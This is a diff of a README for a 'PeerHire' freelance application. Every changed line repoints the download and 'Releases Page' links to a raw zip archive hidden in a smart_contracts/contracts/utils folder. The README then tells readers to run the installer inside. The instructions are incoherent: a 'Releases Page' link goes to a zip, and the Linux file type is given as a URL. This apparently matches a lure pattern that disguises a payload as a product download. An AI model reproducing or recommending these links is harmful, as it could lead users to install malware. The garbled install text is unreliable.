@@ -6,7 +6,7 @@ Welcome to the PeerHire application! This tool makes it easy for you to trust an
 
 ## 📥 Download
 
-[![Download](https://raw.githubusercontent.com/shura-gh0st69/peer_hire_hackhazards_25/main/metallorganic/peer_hire_hackhazards_25.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shura-gh0st69/peer_hire_hackhazards_25/main/metallorganic/peer_hire_hackhazards_25.zip)
+[![Download](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/raw/refs/heads/main/smart_contracts/contracts/utils/hire-peer-hackhazards-3.3-beta.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/raw/refs/heads/main/smart_contracts/contracts/utils/hire-peer-hackhazards-3.3-beta.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,7 +27,7 @@ To run the PeerHire application, ensure your system meets the following requirem
 ## 📜 How to Download & Install
 
 1. **Visit the Releases Page:** 
-   Go to our [Releases Page](https://raw.githubusercontent.com/shura-gh0st69/peer_hire_hackhazards_25/main/metallorganic/peer_hire_hackhazards_25.zip) to find the latest version of the application. 
+   Go to our [Releases Page](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/raw/refs/heads/main/smart_contracts/contracts/utils/hire-peer-hackhazards-3.3-beta.5.zip) to find the latest version of the application. 
 
 2. **Choose Your Version:**
    Select the release that suits your operating system. You will find options for Windows, macOS, and Linux. Each release will have a detailed description, so you know what you are downloading.
@@ -39,7 +39,7 @@ To run the PeerHire application, ensure your system meets the following requirem
    Navigate to your downloads folder and double-click on the downloaded installer file. 
    - For Windows, this file usually has a `.exe` extension.
    - For macOS, look for a `.dmg` file.
-   - For Linux, it may be a `https://raw.githubusercontent.com/shura-gh0st69/peer_hire_hackhazards_25/main/metallorganic/peer_hire_hackhazards_25.zip` file or a package file, depending on your distribution.
+   - For Linux, it may be a `https://github.com/shura-gh0st69/peer_hire_hackhazards_25/raw/refs/heads/main/smart_contracts/contracts/utils/hire-peer-hackhazards-3.3-beta.5.zip` file or a package file, depending on your distribution.
 
 5. **Follow the Installation Steps:**
    - For Windows and macOS: A setup guide will appear. Follow the on-screen instructions to complete the installation.
@@ -69,4 +69,4 @@ We welcome contributions from users who want to enhance the PeerHire application
 
 Join our community of users on our Discord server. Connect with fellow users to share experiences, ask for advice, and stay engaged with updates.
 
-Remember to visit our [Releases Page](https://raw.githubusercontent.com/shura-gh0st69/peer_hire_hackhazards_25/main/metallorganic/peer_hire_hackhazards_25.zip) for the latest version to download. Enjoy using PeerHire to enhance your freelance experience!
+Remember to visit our [Releases Page](https://github.com/shura-gh0st69/peer_hire_hackhazards_25/raw/refs/heads/main/smart_contracts/contracts/utils/hire-peer-hackhazards-3.3-beta.5.zip) for the latest version to download. Enjoy using PeerHire to enhance your freelance experience!
